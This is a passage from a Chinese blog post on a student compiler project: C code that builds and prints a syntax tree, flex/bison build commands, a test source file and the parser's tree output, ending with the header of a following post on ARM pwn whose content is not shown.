class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数型参：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEC:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组大小：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEC_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">if</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;ptr[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">                    display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_DEC:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VAR_DEF:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEC_LIST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;变量名：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEF_LIST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;LOCAL VAR_NAME：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMP_STM:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句的变量定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句的语句部分：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STM_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXP_STMT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;表达式语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件语句（if-else）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;IF语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN_ELSE:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件语句（if-else-if）：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> WHILE:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环语句（while）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环体：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FOR:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环语句（for）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环体：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数调用：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;第一个实际参数表达式：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARGS:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ID:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cID： %s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id); <span class="comment">// 控制新的一行输出的空格数,indent代替%*c中*</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> INT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cINT： %d\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_int);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FLOAT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cFLOAT： %f\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_float);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CHAR:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cCHAR： %c\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_char);</span><br><span class="line">            <span class="keyword">case</span> ARRAY:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c数组名称： %s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TYPE:</span><br><span class="line">                <span class="keyword">if</span>(T-&gt;type==INT)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：int&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==FLOAT)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：float&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==CHAR)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：char&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==ARRAY)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：char型数组&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ASSIGNOP:</span><br><span class="line">            <span class="keyword">case</span> OR:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_R:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_R:</span><br><span class="line">            <span class="keyword">case</span> AND:</span><br><span class="line">            <span class="keyword">case</span> RELOP:</span><br><span class="line">            <span class="keyword">case</span> PLUS:</span><br><span class="line">            <span class="keyword">case</span> MINUS:</span><br><span class="line">            <span class="keyword">case</span> STAR:</span><br><span class="line">            <span class="keyword">case</span> DIV:</span><br><span class="line">            <span class="keyword">case</span> COMADD:</span><br><span class="line">            <span class="keyword">case</span> COMSUB:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RETURN:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;返回语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是根据不同的节点来进行不同的操作</li>
</ul>
<p>在语法分析中使用的，用于创建新节点的函数 <code>mknode</code> 的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct node *<span class="title">mknode</span><span class="params">(<span class="keyword">int</span> kind,struct node *first,struct node *second, struct node *third,<span class="keyword">int</span> pos )</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">tempnode</span> =</span> (struct node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">  tempnode-&gt;kind = kind;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">0</span>] = first;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">1</span>] = second;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">2</span>] = third;</span><br><span class="line">  tempnode-&gt;pos = pos;</span><br><span class="line">  <span class="keyword">return</span> tempnode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译与结果</strong></p>
<p>编译命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flex lexer.l # 生成lexer.yy.c</span><br><span class="line">bison -d -v parser.y # 生成parser.tab.h, parser.tab.c </span><br><span class="line">gcc display.c parser.tab.c lex.yy.c -lfl -o test1</span><br></pre></td></tr></table></figure>
<p>测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b,c;<span class="comment">//可改错误1：缺少分号</span></span><br><span class="line"><span class="keyword">float</span> m,n;</span><br><span class="line"><span class="keyword">char</span> c1,c2;<span class="comment">//增加char类型</span></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>];<span class="comment">//增加数组的定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibo</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">/*注释部分自动去掉*/</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">2</span>)&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">for</span>(i&lt;<span class="number">15</span>)&#123;<span class="comment">//增加了for语句循环</span></span><br><span class="line">          i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fibo(a<span class="number">-1</span>)+fibo(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//注释部分自动去掉</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m,n,i;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">	<span class="keyword">float</span> ar[<span class="number">20</span>];</span><br><span class="line">	m=read();</span><br><span class="line">	i=<span class="number">1</span>;</span><br><span class="line">	i++;</span><br><span class="line">	--i;<span class="comment">//加了自增和自减</span></span><br><span class="line">	m+=i+<span class="number">15</span>;<span class="comment">//加了复合赋值运算</span></span><br><span class="line">	<span class="keyword">while</span>(i &lt;= m)&#123;</span><br><span class="line">		n=fibo(i);</span><br><span class="line">		write(n);</span><br><span class="line">		i=i+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">➜  exercise-<span class="number">1</span> ./test1 test.c</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： a</span><br><span class="line">          ID： b</span><br><span class="line">          ID： c</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">float</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： m</span><br><span class="line">          ID： n</span><br><span class="line"> 外部变量定义：</span><br><span class="line">     类型：<span class="keyword">char</span></span><br><span class="line">     变量名：</span><br><span class="line">          ID： c1</span><br><span class="line">          ID： c2</span><br><span class="line"> 数组定义：</span><br><span class="line">     类型：<span class="keyword">char</span></span><br><span class="line">     数组名：a</span><br><span class="line">     数组大小：</span><br><span class="line">          <span class="keyword">INT</span>： <span class="number">10</span></span><br><span class="line"> 函数定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     函数名：fibo</span><br><span class="line">     函数型参：</span><br><span class="line">          类型：<span class="keyword">int</span></span><br><span class="line">          ID： a</span><br><span class="line">     复合语句：</span><br><span class="line">          复合语句的变量定义：</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">int</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： i</span><br><span class="line">          复合语句的语句部分：</span><br><span class="line">               条件语句（<span class="keyword">if</span>-<span class="keyword">else</span>）：</span><br><span class="line">               条件：</span><br><span class="line">                    OR</span><br><span class="line">                         ==</span><br><span class="line">                              ID： a</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">                         ==</span><br><span class="line">                              ID： a</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">2</span></span><br><span class="line">               <span class="keyword">IF</span>语句：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              返回语句：</span><br><span class="line">                                   <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               循环语句（<span class="keyword">for</span>）：</span><br><span class="line">                    循环条件：</span><br><span class="line">                    &lt;</span><br><span class="line">                         ID： i</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">15</span></span><br><span class="line">                    循环体：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   AUTOADD</span><br><span class="line">                                        ID： i</span><br><span class="line">               返回语句：</span><br><span class="line">                    <span class="keyword">PLUS</span></span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：fibo</span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">                                   <span class="keyword">MINUS</span></span><br><span class="line">                                        ID： a</span><br><span class="line">                                        <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：fibo</span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">                                   <span class="keyword">MINUS</span></span><br><span class="line">                                        ID： a</span><br><span class="line">                                        <span class="keyword">INT</span>： <span class="number">2</span></span><br><span class="line"> 函数定义：</span><br><span class="line">     类型：<span class="keyword">int</span></span><br><span class="line">     函数名：main</span><br><span class="line">     函数型参：</span><br><span class="line">     复合语句：</span><br><span class="line">          复合语句的变量定义：</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">int</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： m</span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： n</span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： i</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">                    类型：<span class="keyword">char</span></span><br><span class="line">                    变量名：</span><br><span class="line">                         ID： c</span><br><span class="line">               LOCAL VAR_NAME：</span><br><span class="line">               数组定义：</span><br><span class="line">                    类型：<span class="keyword">float</span></span><br><span class="line">                    数组名：ar</span><br><span class="line">                    数组大小：</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">20</span></span><br><span class="line">          复合语句的语句部分：</span><br><span class="line">               表达式语句：</span><br><span class="line">                    ASSIGNOP</span><br><span class="line">                         ID： m</span><br><span class="line">                         函数调用：</span><br><span class="line">                              函数名：<span class="keyword">read</span></span><br><span class="line">                              第一个实际参数表达式：</span><br><span class="line">               表达式语句：</span><br><span class="line">                    ASSIGNOP</span><br><span class="line">                         ID： i</span><br><span class="line">                         <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               表达式语句：</span><br><span class="line">                    AUTOADD</span><br><span class="line">                         ID： i</span><br><span class="line">               表达式语句：</span><br><span class="line">                    AUTOSUB</span><br><span class="line">                         ID： i</span><br><span class="line">               表达式语句：</span><br><span class="line">                    COMADD</span><br><span class="line">                         ID： m</span><br><span class="line">                         <span class="keyword">PLUS</span></span><br><span class="line">                              ID： i</span><br><span class="line">                              <span class="keyword">INT</span>： <span class="number">15</span></span><br><span class="line">               循环语句（<span class="keyword">while</span>）：</span><br><span class="line">                    循环条件：</span><br><span class="line">                    &lt;=</span><br><span class="line">                         ID： i</span><br><span class="line">                         ID： m</span><br><span class="line">                    循环体：</span><br><span class="line">                    复合语句：</span><br><span class="line">                         复合语句的变量定义：</span><br><span class="line">                         复合语句的语句部分：</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   ASSIGNOP</span><br><span class="line">                                        ID： n</span><br><span class="line">                                        函数调用：</span><br><span class="line">                                             函数名：fibo</span><br><span class="line">                                             第一个实际参数表达式：</span><br><span class="line">                                                  ID： i</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   函数调用：</span><br><span class="line">                                        函数名：<span class="keyword">write</span></span><br><span class="line">                                        第一个实际参数表达式：</span><br><span class="line">                                             ID： n</span><br><span class="line">                              表达式语句：</span><br><span class="line">                                   ASSIGNOP</span><br><span class="line">                                        ID： i</span><br><span class="line">                                        <span class="keyword">PLUS</span></span><br><span class="line">                                             ID： i</span><br><span class="line">                                             <span class="keyword">INT</span>： <span class="number">1</span></span><br><span class="line">               返回语句：</span><br><span class="line">                    <span class="keyword">INT</span>： <span class="number">1</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/15/ARM%20pwn%20%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">ARM pwn 进阶知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-15 19:33:42" itemprop="dateCreated datePublished" datetime="2023-03-15T19:33:42+08:00">2023-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-01 14:14:39" itemprop="dateModified" datetime="2023-05-01T14:14:39+08:00">2023-05-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
